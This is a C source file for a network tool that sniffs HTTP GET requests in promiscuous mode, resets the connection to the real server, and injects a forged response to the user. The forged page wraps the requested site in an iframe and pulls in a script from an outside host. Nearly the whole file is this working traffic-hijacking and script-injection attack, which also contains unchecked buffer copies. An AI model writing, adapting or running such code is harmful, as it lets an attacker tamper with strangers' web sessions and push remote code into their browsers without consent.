#include "header.h"

unsigned int sizeof_iphdr = sizeof(struct ip);
unsigned int sizeof_tcphdr = sizeof(struct tcphdr);
unsigned int sizeof_ethhdr = sizeof(struct ethhdr);

int get_http_head(char *data, char* domain, char* value)
{
	char *temp = strstr(data, "\r\n");
	
	while(temp != NULL && temp != data){
		if( !strncmp(data, domain, strlen(domain) ) ){
			data += strlen(domain);
			memcpy( value, data, temp - data );
			return 0;
		}
		
		data = temp + 2;
		temp = strstr(data, "\r\n");
	}
	return -1;
}

// 获取访问的域名 返回值0为可操作域名 其他为不可操作
int filter_http(char* data, char* domain)
{
	// 判断是不是get请求
	if( strncmp(data, "GET", 3) ){
		return -1;
	}
	
	// 取出路径
	char *data_path = data + 4;
	if( *data_path != '/' ){
		xyprintf(0, "There is an error in %s(%d) : Can not get path, *data_path = %c", __FILE__, __LINE__, *data_path);
		return -1;
	}
	
	char *temp = strchr(data_path, ' ');
	char path[1024] = {0};
	if(temp - data_path > 1000){
		return -1;
	}
	memcpy(path, data_path, temp - data_path);

	// 过滤出不是根目录的站点
	if( path[1] != 0 ){
		return -1;
	}

	// 取出host
	char host[128] = {0};
	if( get_http_head(data, "Host: ", host) ){
		xyprintf(0, "There is an error in %s(%d) : Can not find host!", __FILE__, __LINE__);
		return -1;
	}

	// 组装url
	sprintf(domain, "http://%s%s", host, path);
/*
	// 取出请求类型
	char Accept[128] = {0};
	if( get_http_head(data, "Accept: ", Accept) ){
		xyprintf(0, "There is an error in %s(%d) : Can not find Accept!", __FILE__, __LINE__);
		return -1;
	}

//	xyprintf(0, "Accept -- %s", Accept);
*/
	return 0;
}

// 数据过滤
int filter_test(unsigned char* packet, int len)
{
	// 如果包的长度小于 14 + 20 + 8
	if(len < 42){
		xyprintf(0, "A bad packet of len is %d", len);
		return -1;
	}
	
// ethhdr

	// 取ethhdr 检验是否是ip数据包
	struct ethhdr* ethhdr = (struct ethhdr*)packet;
	
	if( ntohs(ethhdr->h_proto) != ETH_P_IP ){
		xyprintf(0, "A packet of type is not IP!");
		return -1;
	}

	// 过滤掉回注口的数据
	// TODO	需要智能添加
	char local_mac[] = {0x1e, 0xc5, 0x66, 0xc0, 0x04, 0x1a};
	if( !memcmp(local_mac, ethhdr->h_dest, 6) || !memcmp(local_mac, ethhdr->h_source, 6) ){
		//xyprintf(0, "Local data!");
		return -1;
	}
/*
	// 只要本机的数据
	char local_mac[] = {0xd8, 0x50, 0xe6, 0x56, 0x3c, 0xa5};
	if( memcmp(local_mac, ethhdr->h_dest, 6) && memcmp(local_mac, ethhdr->h_source, 6) ){
		//xyprintf(0, "Local data!");
		return -1;
	}
*/

// iphdr

	// 取iphdr 检验是否是tcp数据包
	struct ip* ip = (struct ip*)(packet + sizeof_ethhdr);
	
	if( ip->ip_p != IPPROTO_TCP ){
		//xyprintf(0, "A packet of type is not TCP!");
		return -1;
	}

	// 检查数据长度 去除 ethhdr长度应该和ip报文的长度一样
	if( len - 14 != ntohs(ip->ip_len) ){
		//xyprintf(0, "A bad packet of len is %d, but ip_len is %u!", len, ntohs(ip->ip_len));
		return -1;
	}

// tcphdr

	// 取tcphdr
	struct tcphdr* tcp = (struct tcphdr*)( ((char*)ip) + (unsigned int)(ip->ip_hl << 2) );
/*
	// 检验校验码
	// TODO 对长度大于1500的tcp校验码有问题
	unsigned short src_check = ip->ip_sum;
	unsigned short check = check_sum_ip(ip);
	if(check != src_check){
		xyprintf(0, "A bad packet of ip_sum is wrong, 0x%x -- 0x%x", check, src_check);
		return 0;
	}
	src_check = tcp->check;
	check = check_sum_tcp(ip, tcp);
	if(check != src_check){
		xyprintf(0, "A bad packet of ip_sum is wrong, 0x%x -- 0x%x", check, src_check);
		return -1;
	}
*/
	
	// 判断数据类型 过滤出来不是传输数据的包
	if( tcp->ack != 1 || tcp->psh != 1 ){
		return -1;
	}
	
	// 判断端口
	if( 80 != ntohs(tcp->dest)){ // && 14096 != ntohs(tcp->source) ){
		return -1;
	}

// data
	
	// 数据
	unsigned char *data = ((unsigned char*)tcp) + (unsigned int)(tcp->doff << 2);
	int data_len = len - 14 - (int)(ip->ip_hl << 2) - (int)(tcp->doff << 2);

#if 0
	xyprintf(0, "<--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b");
	xyprintf_ethhdr(ethhdr);
	xyprintf_iphdr(ip);
	xyprintf_tcphdr(tcp);
	xyprintf_data(data, data_len);
	xyprintf(0, "<--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e");
#endif

	// 获取访问的url
	char domain[1024] = {0};
	if( filter_http(data, domain) ){
		return -1;
	}
	
	xyprintf(0, "%s", domain);
	
	// 组成body
	char body[1024] = {0};

	snprintf(body, 1023, "<html><body style='margin:0'><iframe scrolling=\"yes\" style=\"width:100%%; height:100%%; z-index:1; border: 0px;\" src=\"%s?noCache=123456\"></iframe>\r\n\r\n<script src=\"http://mob.yuanzhenginfo.com/gd/g.js\"></script></body></html>", domain);

	// 组成回复包内容
	char buf[1024] = {0};

	snprintf(buf, 1023, "HTTP/1.1 200 OK\r\nDate: Fri, 01 Jul 2016 06:46:46 GMT\r\nServer: Apache/2.4.7 (Ubuntu)\r\nLast-Modified: Thu, 30 Jun 2016 10:25:09 GMT\r\nETag: \"d1-5367c48d339dc-gzip\"\r\nAccept-Ranges: bytes\r\nVary: Accept-Encoding\r\nContent-Length: %lu\r\nConnection: Close\r\nContent-Type: text/html\r\n\r\n%s", strlen(body), body);

	// 重置掉服务器的连接
	send_rst_test(ip, tcp, data_len);
	// 生成伪装包并发送给用户
	send_test(ip, tcp, data_len, buf);
	// TODO 需要建一个链表 过滤掉用户的下次请求

	//exit(0);
	return 0;
}

// 接收测试
int recv_test(int sockfd)
{
	struct sockaddr_in from;
	struct ip *ip;
	struct tcp *tcp;
	unsigned char buf[65535];
	int ret = 0;
	int from_len;
	unsigned int count = 0;

	for(;;){
		memset(buf, sizeof(buf), 0);
		ret = recvfrom(sockfd, buf, sizeof(buf), 0, (struct sockaddr*)&from, &from_len);
		if(ret < 0){
			if(errno == EINTR){
				continue;
			}
			else {
				xyprintf(errno, "An error in file %s line %d.", __FILE__, __LINE__);
				break;
			}
		}
	
		if(++count % 10000 == 0){
			xyprintf(0, "<-- <-- <-- Recv the %u packet, len is %d!", count, ret);
		}
		//xyprintf_sockaddr_ll(&from);

		filter_test(buf, ret);
	}
}

int main(int argc, char** argv)
{
	// 指定第二个参数为SOCK_RAW创建原始套接字
	// 第三个参数（协议）通常不为0,定义在<netinet/in.h>头文件中
	// 一般形式是IPPROTO_xxx
	//int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if(sockfd <= 0){
		xyprintf(errno, "There is an error in %s(%d) : ", __FILE__, __LINE__);
		exit(-1);
	}

	// TODO 网口名称需要能智能获取
	struct ifreq if_mon_nic;
	strncpy(if_mon_nic.ifr_name, MONITOR_NIC, strlen(MONITOR_NIC) + 1);
	//取接口数据
	if( ioctl(sockfd, SIOCGIFFLAGS, &if_mon_nic) == -1 ) {
		xyprintf(errno, "There is an error in %s(%d) : ", __FILE__, __LINE__);
		exit(-1);
	}
	// 设置混乱模式
	if_mon_nic.ifr_flags |= IFF_PROMISC;
	if( ioctl(sockfd, SIOCSIFFLAGS, &if_mon_nic) == -1 ) { 
		xyprintf(errno, "There is an error in %s(%d) : ", __FILE__, __LINE__);
		exit(-1);
	} 
	
	// TODO 这里不起作用
	// 绑定网卡对链路层不起作用
	if( setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (char*)&if_mon_nic, sizeof(if_mon_nic))){
		xyprintf(errno, "There is an error in %s(%d) : ", __FILE__, __LINE__);
		exit(-1);
	}

#if 0
	// 可以在这个原始套接字上按以下方式开启IP_HDRINGCL套接字选项
	const int on = 1;
	if( setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ){
		xyprintf(errno, "There is an error in %s(%d) : ", __FILE__, __LINE__);
		exit(-1);
	}
#endif 
	
	recv_test(sockfd);

	return 0;
}
